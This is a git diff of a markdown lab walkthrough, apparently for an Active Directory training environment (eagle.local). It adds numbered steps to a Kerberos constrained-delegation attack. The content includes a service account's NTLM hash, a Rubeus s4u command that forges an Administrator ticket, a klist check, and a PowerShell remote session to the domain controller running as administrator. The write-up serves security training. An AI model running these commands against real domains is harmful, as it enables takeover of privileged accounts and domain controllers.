@@ -31,10 +31,25 @@ We can see that the user web_service is set up to delegate the HTTP service to t
 [*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF (NTLM hash)
 ```
 
-## We will use Rubeus to get a ticket for the Administrator account:
+## 3. We will use Rubeus to get a ticket for the Administrator account:
 
 ```
 .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
 ```
 <img width="1312" height="341" alt="image" src="https://github.com/user-attachments/assets/fe9c9deb-e71e-408c-9ce0-04139677b47e" />
+
+## Check New TGS ticket
+
+```
+klist
+```
+<img width="1306" height="353" alt="image" src="https://github.com/user-attachments/assets/b166f5ea-3840-4d37-947e-de6ce786a5f7" />
+
+## 4. Now let's connect to the Domain Controller impersonating the account Administrator
+
+```
+PS C:\Users\bob\Downloads> Enter-PSSession dc1
+[dc1]: PS C:\Users\Administrator\Documents> whoami
+eagle\administrator
+```
 
